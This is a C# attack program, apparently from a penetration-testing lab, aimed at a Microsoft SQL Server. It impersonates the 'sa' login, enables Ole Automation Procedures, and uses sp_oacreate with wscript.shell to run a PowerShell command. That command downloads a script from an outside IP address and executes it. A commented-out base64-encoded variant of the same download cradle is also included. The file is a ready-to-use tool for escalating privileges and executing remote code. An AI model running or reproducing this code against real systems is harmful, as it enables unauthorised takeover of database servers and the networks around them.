using System;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MSSQL___Execution_sp_oacreate
{
    class sp_oacreate
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            //Authenticates
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            //Login impersonation
            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            //Enabling Ole Automation Procedures
            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
            //Executing system command
            //String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell',  @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test >  C:\\Tools\\file.txt\"';";


            //Este funciona bien
            String revshell = "powershell -C \"IEX((New-Object System.Net.WebClient).DownloadString(''http://192.168.49.179/run.txt''))\"";

            //Este funciona porque no hay limitacion de 128 caracteres
            //String revshell = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEANwA5AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA";

          
            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell',  @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '" + revshell + "';";
            Console.WriteLine("execCmd: " + execCmd);

            //Execute impersonateUser
            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            //Execute enable_ole
            command = new SqlCommand(enable_ole, con);
            reader = command.ExecuteReader();
            reader.Close();

            //Execute execCmd
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            //No podemos leer el output porque @myshell corre en el contexto de una variable local. Por eso el resultado se vuelca contra un fichero
            //reader.Read();
            //Console.WriteLine("Result of command is: " + reader[0]);
            
            reader.Close();

            con.Close();
        }
    }
}